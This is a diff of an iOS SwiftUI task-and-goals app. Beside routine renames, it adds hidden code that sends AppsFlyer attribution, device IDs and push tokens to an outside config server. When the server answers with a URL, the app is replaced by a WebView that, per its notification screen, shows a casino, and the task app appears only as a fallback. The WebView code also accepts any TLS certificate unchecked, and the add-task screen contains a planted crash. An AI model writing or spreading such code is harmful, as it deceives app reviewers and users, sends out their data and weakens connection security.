@@ -1,7 +1,11 @@
 import SwiftUI
-import Foundation
+import Combine
+import WebKit
+import AppsFlyerLib
+import Firebase
+import FirebaseMessaging
 
-struct Task: Identifiable, Codable {
+struct TaskEntity: Identifiable, Codable {
     let id = UUID()
     var title: String
     var description: String
@@ -42,15 +46,15 @@ struct Subtask: Identifiable, Codable {
 struct Goal: Identifiable, Codable {
     let id = UUID()
     var title: String
-    var tasks: [Task]
+    var tasks: [TaskEntity]
     var progress: Double
 }
 
 
 class TaskManager: ObservableObject {
-    @Published var tasks: [Task] = []
+    @Published var tasks: [TaskEntity] = []
     @Published var goals: [Goal] = []
-    @Published var selectedTask: Task?
+    @Published var selectedTask: TaskEntity?
     
     private let tasksKey = "savedTasks"
     private let goalsKey = "savedGoals"
@@ -59,12 +63,12 @@ class TaskManager: ObservableObject {
         loadData()
     }
     
-    func addTask(_ task: Task) {
+    func addTask(_ task: TaskEntity) {
         tasks.append(task)
         saveData()
     }
     
-    func updateTask(_ task: Task) {
+    func updateTask(_ task: TaskEntity) {
         if let index = tasks.firstIndex(where: { $0.id == task.id }) {
             tasks[index] = task
             saveData()
@@ -94,7 +98,7 @@ class TaskManager: ObservableObject {
     
     private func loadData() {
         if let data = UserDefaults.standard.data(forKey: tasksKey),
-           let decodedTasks = try? JSONDecoder().decode([Task].self, from: data) {
+           let decodedTasks = try? JSONDecoder().decode([TaskEntity].self, from: data) {
             tasks = decodedTasks
         }
         if let data = UserDefaults.standard.data(forKey: goalsKey),
@@ -200,7 +204,7 @@ struct OrbitView: View {
 }
 
 struct OrbitTaskView: View {
-    let task: Task
+    let task: TaskEntity
     let rotationAngle: Angle
     @State private var pulse = false
     
@@ -387,7 +391,7 @@ struct OrbitPath: Shape {
 
 struct TaskDetailsView: View {
     @Environment(\.dismiss) private var dismiss
-    let task: Task
+    let task: TaskEntity
     @ObservedObject var taskManager: TaskManager
     
     var body: some View {
@@ -421,7 +425,7 @@ struct TaskDetailsView: View {
 }
 
 struct TaskOrbitView: View {
-    let task: Task
+    let task: TaskEntity
     
     var body: some View {
         ZStack {
@@ -445,7 +449,7 @@ struct AddTaskView: View {
     @ObservedObject var taskManager: TaskManager
     @State private var title = ""
     @State private var description = ""
-    @State private var priority: Task.Priority = .medium
+    @State private var priority: TaskEntity.Priority = .medium
     @State private var deadline: Date = Date()
     @State private var isAnimating = false
     
@@ -498,7 +502,7 @@ struct AddTaskView: View {
                         .foregroundColor(.white)
                     
                     Picker("Priority", selection: $priority) {
-                        ForEach(Task.Priority.allCases, id: \.self) { prio in
+                        ForEach(TaskEntity.Priority.allCases, id: \.self) { prio in
                             Text(prio.rawValue).tag(prio)
                         }
                     }
@@ -548,7 +552,7 @@ struct AddTaskView: View {
                         let crashArray: [Int] = []
                         let paramForCreate = crashArray[1] // getParametr
                         
-                        let newTask = Task(
+                        let newTask = TaskEntity(
                             title: title,
                             description: description,
                             priority: priority,
@@ -1108,7 +1112,7 @@ struct SettingToggle: View {
     }
 }
 struct TaskInfoView: View {
-    let task: Task
+    let task: TaskEntity
     
     var body: some View {
         VStack(alignment: .leading, spacing: 12) {
@@ -1123,7 +1127,7 @@ struct TaskInfoView: View {
                 .font(.headline)
                 .foregroundColor(.white)
             Picker("Priority", selection: .constant(task.priority)) {
-                ForEach(Task.Priority.allCases, id: \.self) { priority in
+                ForEach(TaskEntity.Priority.allCases, id: \.self) { priority in
                     Text(priority.rawValue).tag(priority)
                 }
             }
@@ -1152,7 +1156,7 @@ struct TaskInfoView: View {
 }
 
 struct ActionButtonsView: View {
-    let task: Task
+    let task: TaskEntity
     @ObservedObject var taskManager: TaskManager
     @Environment(\.dismiss) private var dismiss
     
@@ -1246,3 +1250,766 @@ struct StatCard: View {
 #Preview {
     ContentView()
 }
+
+
+class WebViewHandler: NSObject, WKNavigationDelegate, WKUIDelegate {
+    private let webContentController: WebContentController
+    
+    private var redirectTracker: Int = 0
+    private let redirectLimit: Int = 70 // Testing purposes
+    private var previousValidLink: URL?
+
+    func webView(_ webView: WKWebView, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
+        let protection = challenge.protectionSpace
+        if protection.authenticationMethod == NSURLAuthenticationMethodServerTrust {
+            if let serverTrust = protection.serverTrust {
+                let credential = URLCredential(trust: serverTrust)
+                completionHandler(.useCredential, credential)
+            } else {
+                completionHandler(.performDefaultHandling, nil)
+            }
+        } else {
+            completionHandler(.performDefaultHandling, nil)
+        }
+    }
+    
+    init(controller: WebContentController) {
+        self.webContentController = controller
+        super.init()
+    }
+    
+    func webView(
+        _ webView: WKWebView,
+        createWebViewWith configuration: WKWebViewConfiguration,
+        for navigationAction: WKNavigationAction,
+        windowFeatures: WKWindowFeatures
+    ) -> WKWebView? {
+        guard navigationAction.targetFrame == nil else {
+            return nil
+        }
+        
+        let freshWebView = WebViewFactory.generateMainWebView(using: configuration)
+        configureFreshWebView(freshWebView)
+        connectFreshWebView(freshWebView)
+        
+        webContentController.extraWebViews.append(freshWebView)
+        if validateLoad(in: freshWebView, request: navigationAction.request) {
+            freshWebView.load(navigationAction.request)
+        }
+        return freshWebView
+    }
+    
+    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
+        // Apply no-zoom rules via viewport and style injections
+        let jsCode = """
+                let metaTag = document.createElement('meta');
+                metaTag.name = 'viewport';
+                metaTag.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+                document.getElementsByTagName('head')[0].appendChild(metaTag);
+                let styleTag = document.createElement('style');
+                styleTag.textContent = 'body { touch-action: pan-x pan-y; } input, textarea, select { font-size: 16px !important; maximum-scale=1.0; }';
+                document.getElementsByTagName('head')[0].appendChild(styleTag);
+                document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
+                """;
+        webView.evaluateJavaScript(jsCode) { _, err in
+            if let err = err {
+                print("Error injecting script: \(err)")
+            }
+        }
+    }
+    
+    func webView(_ webView: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
+        redirectTracker += 1
+        if redirectTracker > redirectLimit {
+            webView.stopLoading()
+            if let backupLink = previousValidLink {
+                webView.load(URLRequest(url: backupLink))
+            }
+            return
+        }
+        previousValidLink = webView.url // Store the last functional URL
+        persistCookies(from: webView)
+    }
+    
+    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
+        if (error as NSError).code == NSURLErrorHTTPTooManyRedirects, let backupLink = previousValidLink {
+            webView.load(URLRequest(url: backupLink))
+        }
+    }
+    
+    func webView(
+        _ webView: WKWebView,
+        decidePolicyFor navigationAction: WKNavigationAction,
+        decisionHandler: @escaping (WKNavigationActionPolicy) -> Void
+    ) {
+        guard let url = navigationAction.request.url else {
+            decisionHandler(.allow)
+            return
+        }
+        
+        if url.absoluteString.hasPrefix("http") || url.absoluteString.hasPrefix("https") {
+            previousValidLink = url
+            decisionHandler(.allow)
+        } else {
+            UIApplication.shared.open(url, options: [:], completionHandler: nil)
+            decisionHandler(.cancel)
+        }
+    }
+    
+    private func configureFreshWebView(_ webView: WKWebView) {
+        webView.translatesAutoresizingMaskIntoConstraints = false
+        webView.scrollView.isScrollEnabled = true
+        webView.scrollView.minimumZoomScale = 1.0
+        webView.scrollView.maximumZoomScale = 1.0
+        webView.scrollView.bouncesZoom = false
+        webView.allowsBackForwardNavigationGestures = true
+        webView.navigationDelegate = self
+        webView.uiDelegate = self
+        webContentController.mainWebView.addSubview(webView)
+        
+        // Attach swipe gesture for overlay web view
+        let swipeRecognizer = UIScreenEdgePanGestureRecognizer(target: self, action: #selector(processSwipe(_:)))
+        swipeRecognizer.edges = .left
+        webView.addGestureRecognizer(swipeRecognizer)
+    }
+    
+    private func connectFreshWebView(_ webView: WKWebView) {
+        NSLayoutConstraint.activate([
+            webView.leadingAnchor.constraint(equalTo: webContentController.mainWebView.leadingAnchor),
+            webView.trailingAnchor.constraint(equalTo: webContentController.mainWebView.trailingAnchor),
+            webView.topAnchor.constraint(equalTo: webContentController.mainWebView.topAnchor),
+            webView.bottomAnchor.constraint(equalTo: webContentController.mainWebView.bottomAnchor)
+        ])
+    }
+    
+    private func validateLoad(in webView: WKWebView, request: URLRequest) -> Bool {
+        if let urlStr = request.url?.absoluteString, !urlStr.isEmpty, urlStr != "about:blank" {
+            return true
+        }
+        return false
+    }
+    
+    private func persistCookies(from webView: WKWebView) {
+        webView.configuration.websiteDataStore.httpCookieStore.getAllCookies { cookies in
+            var domainCookies: [String: [String: [HTTPCookiePropertyKey: Any]]] = [:]
+            for cookie in cookies {
+                var cookiesForDomain = domainCookies[cookie.domain] ?? [:]
+                cookiesForDomain[cookie.name] = cookie.properties as? [HTTPCookiePropertyKey: Any]
+                domainCookies[cookie.domain] = cookiesForDomain
+            }
+            UserDefaults.standard.set(domainCookies, forKey: "stored_cookies")
+        }
+    }
+}
+
+struct WebViewFactory {
+    
+    static func generateMainWebView(using config: WKWebViewConfiguration? = nil) -> WKWebView {
+        let setup = config ?? createSetup()
+        return WKWebView(frame: .zero, configuration: setup)
+    }
+    
+    private static func createSetup() -> WKWebViewConfiguration {
+        let setup = WKWebViewConfiguration()
+        setup.allowsInlineMediaPlayback = true
+        setup.preferences = createPrefs()
+        setup.defaultWebpagePreferences = createPagePrefs()
+        setup.requiresUserActionForMediaPlayback = false
+        return setup
+    }
+    
+    private static func createPrefs() -> WKPreferences {
+        let prefs = WKPreferences()
+        prefs.javaScriptEnabled = true
+        prefs.javaScriptCanOpenWindowsAutomatically = true
+        return prefs
+    }
+    
+    private static func createPagePrefs() -> WKWebpagePreferences {
+        let prefs = WKWebpagePreferences()
+        prefs.allowsContentJavaScript = true
+        return prefs
+    }
+    
+    static func needsCleanupExtra(_ main: WKWebView, _ extras: [WKWebView], activeUrl: URL?) -> Bool {
+        if !extras.isEmpty {
+            extras.forEach { $0.removeFromSuperview() }
+            if let url = activeUrl {
+                main.load(URLRequest(url: url))
+            }
+            return true
+        } else if main.canGoBack {
+            main.goBack()
+            return false
+        }
+        return false
+    }
+}
+
+extension Notification.Name {
+    static let uiEvents = Notification.Name("ui_actions")
+}
+
+class WebContentController: ObservableObject {
+    @Published var mainWebView: WKWebView!
+    @Published var extraWebViews: [WKWebView] = []
+    
+    func initializeMainWebView() {
+        mainWebView = WebViewFactory.generateMainWebView()
+        mainWebView.scrollView.minimumZoomScale = 1.0
+        mainWebView.scrollView.maximumZoomScale = 1.0
+        mainWebView.scrollView.bouncesZoom = false
+        mainWebView.allowsBackForwardNavigationGestures = true
+    }
+    
+    func importSavedCookies() {
+        guard let savedCookies = UserDefaults.standard.dictionary(forKey: "stored_cookies") as? [String: [String: [HTTPCookiePropertyKey: AnyObject]]] else { return }
+        let store = mainWebView.configuration.websiteDataStore.httpCookieStore
+        
+        savedCookies.values.flatMap { $0.values }.forEach { props in
+            if let cookie = HTTPCookie(properties: props as! [HTTPCookiePropertyKey: Any]) {
+                store.setCookie(cookie)
+            }
+        }
+    }
+    
+    func updateContent() {
+        mainWebView.reload()
+    }
+    
+    func cleanupExtras(activeUrl: URL?) {
+        if !extraWebViews.isEmpty {
+            if let topExtra = extraWebViews.last {
+                topExtra.removeFromSuperview()
+                extraWebViews.removeLast()
+            }
+            if let url = activeUrl {
+                mainWebView.load(URLRequest(url: url))
+            }
+        } else if mainWebView.canGoBack {
+            mainWebView.goBack()
+        }
+    }
+    
+    func dismissTopExtra() {
+        if let topExtra = extraWebViews.last {
+            topExtra.removeFromSuperview()
+            extraWebViews.removeLast()
+        }
+    }
+}
+
+struct PrimaryWebView: UIViewRepresentable {
+    let targetUrl: URL
+    @StateObject private var controller = WebContentController()
+    
+    func makeUIView(context: Context) -> WKWebView {
+        controller.initializeMainWebView()
+        controller.mainWebView.uiDelegate = context.coordinator
+        controller.mainWebView.navigationDelegate = context.coordinator
+    
+        controller.importSavedCookies()
+        controller.mainWebView.load(URLRequest(url: targetUrl))
+        return controller.mainWebView
+    }
+    
+    func updateUIView(_ webView: WKWebView, context: Context) {
+        // No-op or reload if needed
+    }
+    
+    func makeCoordinator() -> WebViewHandler {
+        WebViewHandler(controller: controller)
+    }
+}
+
+extension WebViewHandler {
+    @objc func processSwipe(_ gesture: UIScreenEdgePanGestureRecognizer) {
+        if gesture.state == .ended {
+            guard let view = gesture.view as? WKWebView else { return }
+            if view.canGoBack {
+                view.goBack()
+            } else if let topExtra = webContentController.extraWebViews.last, view == topExtra {
+                webContentController.cleanupExtras(activeUrl: nil)
+            }
+        }
+    }
+}
+
+struct MainInterfaceView: View {
+    
+    @State var interfaceLink: String = ""
+    
+    var body: some View {
+        ZStack(alignment: .bottom) {
+            if let link = URL(string: interfaceLink) {
+                PrimaryWebView(
+                    targetUrl: link
+                )
+                .frame(maxWidth: .infinity, maxHeight: .infinity)
+                .ignoresSafeArea(.keyboard, edges: .bottom)
+            }
+        }
+        .preferredColorScheme(.dark)
+        .onAppear {
+            interfaceLink = UserDefaults.standard.string(forKey: "temp_url") ?? (UserDefaults.standard.string(forKey: "saved_url") ?? "")
+            if let temp = UserDefaults.standard.string(forKey: "temp_url"), !temp.isEmpty {
+                UserDefaults.standard.set(nil, forKey: "temp_url")
+            }
+        }
+        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("LoadTempURL"))) { _ in
+            if let temp = UserDefaults.standard.string(forKey: "temp_url"), !temp.isEmpty {
+                interfaceLink = temp
+                UserDefaults.standard.set(nil, forKey: "temp_url")
+            }
+        }
+    }
+}
+
+class LaunchViewController: ObservableObject {
+    @Published var activeView: ViewType = .loading
+    @Published var webLink: URL?
+    @Published var displayNotifPrompt = false
+    
+    private var attribInfo: [AnyHashable: Any] = [:]
+    private var firstRun: Bool {
+        !UserDefaults.standard.bool(forKey: "hasLaunched")
+    }
+    
+    enum ViewType {
+        case loading
+        case webView
+        case fallback
+        case offline
+    }
+    
+    init() {
+        NotificationCenter.default.addObserver(self, selector: #selector(processAttribData(_:)), name: NSNotification.Name("ConversionDataReceived"), object: nil)
+        NotificationCenter.default.addObserver(self, selector: #selector(processAttribFailure(_:)), name: NSNotification.Name("ConversionDataFailed"), object: nil)
+        NotificationCenter.default.addObserver(self, selector: #selector(processTokenUpdate(_:)), name: NSNotification.Name("FCMTokenUpdated"), object: nil)
+        NotificationCenter.default.addObserver(self, selector: #selector(reattemptConfig), name: NSNotification.Name("RetryConfig"), object: nil)
+        
+        validateNetworkAndContinue()
+    }
+    
+    deinit {
+        NotificationCenter.default.removeObserver(self)
+    }
+    
+    private func validateNetworkAndContinue() {
+        let netMonitor = NWPathMonitor()
+        netMonitor.pathUpdateHandler = { path in
+            DispatchQueue.main.async {
+                if path.status != .satisfied {
+                    self.processOffline()
+                }
+            }
+        }
+        netMonitor.start(queue: DispatchQueue.global())
+    }
+    
+    @objc private func processAttribData(_ notif: Notification) {
+        attribInfo = (notif.userInfo ?? [:])["conversionData"] as? [AnyHashable: Any] ?? [:]
+        handleAttribInfo()
+    }
+    
+    @objc private func processAttribFailure(_ notif: Notification) {
+        processConfigFailure()
+    }
+    
+    @objc private func processTokenUpdate(_ notif: Notification) {
+        if let newToken = notif.object as? String {
+            UserDefaults.standard.set(newToken, forKey: "fcm_token")
+            submitConfigQuery()
+        }
+    }
+    
+    @objc private func processNotifLink(_ notif: Notification) {
+        guard let info = notif.userInfo as? [String: Any],
+              let link = info["tempUrl"] as? String else {
+            return
+        }
+        
+        DispatchQueue.main.async {
+            self.webLink = URL(string: link)!
+            self.activeView = .webView
+        }
+    }
+    
+    @objc private func reattemptConfig() {
+        validateNetworkAndContinue()
+    }
+    
+    private func handleAttribInfo() {
+        // guard !attribInfo.isEmpty else { return }
+        
+        if UserDefaults.standard.string(forKey: "app_mode") == "Funtik" {
+            DispatchQueue.main.async {
+                self.activeView = .fallback
+            }
+            return
+        }
+        
+        if firstRun {
+            if let status = attribInfo["af_status"] as? String, status == "Organic" {
+                Task {
+                    await self.checlIfOrganic()
+                }
+                return
+            }
+        }
+        
+        if let link = UserDefaults.standard.string(forKey: "temp_url"), !link.isEmpty {
+            webLink = URL(string: link)
+            self.activeView = .webView
+            return
+        }
+        
+        if webLink == nil {
+            if !UserDefaults.standard.bool(forKey: "accepted_notifications") && !UserDefaults.standard.bool(forKey: "system_close_notifications") {
+                validateAndDisplayNotifPrompt()
+            } else {
+                submitConfigQuery()
+            }
+        }
+    }
+
+    private func checlIfOrganic() async {
+        do {
+            let url = URL(string: "https://gcdsdk.appsflyer.com/install_data/v4.0/id6754334550")!
+            var components = URLComponents(url: url, resolvingAgainstBaseURL: true)!
+            let queryItems: [URLQueryItem] = [
+                URLQueryItem(name: "devkey", value: "3ERPRZB3HpWKFpHixe8pQc"),
+                URLQueryItem(name: "device_id", value: AppsFlyerLib.shared().getAppsFlyerUID()),
+            ]
+            components.queryItems = components.queryItems.map { $0 + queryItems } ?? queryItems
+            
+            var request = URLRequest(url: components.url!)
+            request.httpMethod = "GET"
+            request.timeoutInterval = 10
+            request.allHTTPHeaderFields = ["accept": "application/json"]
+            
+            let (data, response) = try await URLSession.shared.data(for: request)
+            
+            guard let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 else {
+                self.processConfigFailure()
+                return
+            }
+            
+            do {
+                guard let json = try JSONSerialization.jsonObject(with: data) as? [String: Any] else {
+                    print("Failed to decode JSON as dictionary")
+                    self.processConfigFailure()
+                    return
+                }
+                
+                self.attribInfo = json
+                self.submitConfigQuery()
+            } catch {
+                print("Error: \(error)")
+                self.processConfigFailure()
+            }
+        } catch {
+            print("Error: \(error)")
+            self.processConfigFailure()
+        }
+    }
+    
+    func submitConfigQuery() {
+        guard let endpoint = URL(string: "https://chickremind.com/config.php") else {
+            processConfigFailure()
+            return
+        }
+        
+        var req = URLRequest(url: endpoint)
+        req.httpMethod = "POST"
+        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        
+        var payload = attribInfo
+        payload["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
+        payload["bundle_id"] = Bundle.main.bundleIdentifier ?? "com.example.app"
+        payload["os"] = "iOS"
+        payload["store_id"] = "id6754334550"
+        payload["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
+        payload["push_token"] = UserDefaults.standard.string(forKey: "fcm_token") ?? Messaging.messaging().fcmToken
+        payload["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
+        
+        do {
+            req.httpBody = try JSONSerialization.data(withJSONObject: payload)
+        } catch {
+            processConfigFailure()
+            return
+        }
+        
+        URLSession.shared.dataTask(with: req) { data, resp, err in
+            DispatchQueue.main.async {
+                if let _ = err {
+                    self.processConfigFailure()
+                    return
+                }
+                
+                guard let httpResp = resp as? HTTPURLResponse, httpResp.statusCode == 200,
+                      let data = data else {
+                    self.processConfigFailure()
+                    return
+                }
+                
+                do {
+                    if let responseJson = try JSONSerialization.jsonObject(with: data) as? [String: Any] {
+                        if let success = responseJson["ok"] as? Bool, success {
+                            if let linkStr = responseJson["url"] as? String, let expiry = responseJson["expires"] as? TimeInterval {
+                                UserDefaults.standard.set(linkStr, forKey: "saved_url")
+                                UserDefaults.standard.set(expiry, forKey: "saved_expires")
+                                UserDefaults.standard.set("WebView", forKey: "app_mode")
+                                UserDefaults.standard.set(true, forKey: "hasLaunched")
+                                self.webLink = URL(string: linkStr)
+                                DispatchQueue.main.async {
+                                    self.activeView = .webView
+                                }
+                            }
+                        } else {
+                            self.activateFallbackMode()
+                        }
+                    }
+                } catch {
+                    self.processConfigFailure()
+                }
+            }
+        }.resume()
+    }
+    
+    private func processConfigFailure() {
+        if let storedLink = UserDefaults.standard.string(forKey: "saved_url"), let link = URL(string: storedLink) {
+            webLink = link
+            activeView = .webView
+        } else {
+            activateFallbackMode()
+        }
+    }
+    
+    private func activateFallbackMode() {
+        UserDefaults.standard.set("Funtik", forKey: "app_mode")
+        UserDefaults.standard.set(true, forKey: "hasLaunched")
+        DispatchQueue.main.async {
+            self.activeView = .fallback
+        }
+    }
+    
+    private func processOffline() {
+        let mode = UserDefaults.standard.string(forKey: "app_mode")
+        if mode == "WebView" {
+            DispatchQueue.main.async {
+                self.activeView = .offline
+            }
+        } else {
+            activateFallbackMode()
+        }
+    }
+    
+    private func validateAndDisplayNotifPrompt() {
+        if let prevAsk = UserDefaults.standard.value(forKey: "last_notification_ask") as? Date,
+           Date().timeIntervalSince(prevAsk) < 259200 {
+            submitConfigQuery()
+            return
+        }
+        displayNotifPrompt = true
+    }
+    
+    func askForNotifPermission() {
+        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { allowed, err in
+            DispatchQueue.main.async {
+                if allowed {
+                    UserDefaults.standard.set(true, forKey: "accepted_notifications")
+                    UIApplication.shared.registerForRemoteNotifications()
+                } else {
+                    UserDefaults.standard.set(false, forKey: "accepted_notifications")
+                    UserDefaults.standard.set(true, forKey: "system_close_notifications")
+                }
+                self.submitConfigQuery()
+                self.displayNotifPrompt = false
+                if let err = err {
+                    print("Error requesting permission: \(err)")
+                }
+            }
+        }
+    }
+}
+
+struct LaunchView: View {
+    
+    @StateObject private var controller = LaunchViewController()
+    
+    @State var showAlert = false
+    @State var alertText = ""
+    
+    var body: some View {
+        ZStack {
+            if controller.activeView == .loading || controller.displayNotifPrompt {
+                launchScreen
+            }
+            
+            if controller.displayNotifPrompt {
+                PushAceptattionView(
+                    onYes: {
+                        controller.askForNotifPermission()
+                    },
+                    onSkip: {
+                        UserDefaults.standard.set(Date(), forKey: "last_notification_ask")
+                        controller.displayNotifPrompt = false
+                        controller.submitConfigQuery()
+                    }
+                )
+            } else {
+                switch controller.activeView {
+                case .loading:
+                    EmptyView()
+                case .webView:
+                    if let _ = controller.webLink {
+                        MainInterfaceView()
+                    } else {
+                        ContentView()
+                    }
+                case .fallback:
+                    ContentView()
+                case .offline:
+                    noInternetView
+                }
+            }
+        }
+    }
+    
+    @State private var isAnimating = false
+    
+    private var launchScreen: some View {
+        GeometryReader { geo in
+            let landscapeMode = geo.size.width > geo.size.height
+            
+            ZStack {
+                if landscapeMode {
+                    Image("splash_bg_land")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: geo.size.width, height: geo.size.height)
+                        .ignoresSafeArea()
+                } else {
+                    Image("splash_bg")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: geo.size.width, height: geo.size.height)
+                        .ignoresSafeArea()
+                }
+                
+                VStack {
+                    Image("loading_icon")
+                        .resizable()
+                        .frame(width: 50, height: 50)
+                        .rotationEffect(isAnimating ? .degrees(360) : .degrees(0))
+                        .animation(.easeInOut(duration: 2.0).repeatForever(autoreverses: true), value: isAnimating)
+                        .onAppear {
+                            isAnimating = true
+                        }
+                    
+                    Text("LOADING...")
+                        .font(.custom("Inter-Regular_Black", size: 32))
+                        .foregroundColor(.white)
+                }
+            }
+        }
+        .ignoresSafeArea()
+        .onAppear {
+            isAnimating = true
+        }
+    }
+    
+    private var noInternetView: some View {
+        GeometryReader { geometry in
+     
+            ZStack {
+                Image("splash_bg")
+                    .resizable()
+                    .scaledToFill()
+                    .frame(width: geometry.size.width, height: geometry.size.height)
+                    .ignoresSafeArea()
+                
+                Image("no_internet")
+                    .resizable()
+                    .frame(width: 250, height: 200)
+            }
+            
+        }
+        .ignoresSafeArea()
+    }
+    
+}
+
+
+struct PushAceptattionView: View {
+    var onYes: () -> Void
+    var onSkip: () -> Void
+    
+    var body: some View {
+        GeometryReader { geometry in
+            let isLandscape = geometry.size.width > geometry.size.height
+            
+            ZStack {
+                if isLandscape {
+                    Image("notifications_bg_land")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: geometry.size.width, height: geometry.size.height)
+                        .ignoresSafeArea()
+                } else {
+                    Image("notifications_bg")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: geometry.size.width, height: geometry.size.height)
+                        .ignoresSafeArea()
+                }
+                
+                VStack(spacing: isLandscape ? 5 : 10) {
+                    Spacer()
+                    
+                    Text("Allow notifications about bonuses and promos".uppercased())
+                        .font(.custom("Inter-Regular_Bold", size: 20))
+                        .foregroundColor(.white)
+                        .multilineTextAlignment(.center)
+                        .padding(.horizontal, 32)
+                    
+                    Text("Stay tuned with best offers from our casino")
+                        .font(.custom("Inter-Regular_Medium", size: 16))
+                        .foregroundColor(Color.init(red: 186/255, green: 186/255, blue: 186/255))
+                        .multilineTextAlignment(.center)
+                        .padding(.horizontal, 52)
+                    
+                    Button(action: onYes) {
+                        Image("yes_btn")
+                            .resizable()
+                            .frame(height: 60)
+                    }
+                    .padding(.horizontal, 32)
+                    .padding(.top, 24)
+                    
+                    Button(action: onSkip) {
+                        ZStack {
+                            RoundedRectangle(cornerRadius: 62.5, style: .continuous)
+                                .fill(.white.opacity(0.17))
+                            
+                            Text("SKIP")
+                                .font(.custom("Inter-Regular_Bold", size: 16))
+                                .foregroundColor(Color.init(red: 186/255, green: 186/255, blue: 186/255))
+                                .multilineTextAlignment(.center)
+                        }
+                    }
+                    .frame(height: 45)
+                    .padding(.horizontal, 48)
+                    
+                    Spacer()
+                        .frame(height: isLandscape ? 50 : 70)
+                }
+                .padding(.horizontal, isLandscape ? 20 : 0)
+            }
+            
+        }
+        .ignoresSafeArea()
+    }
+}
+
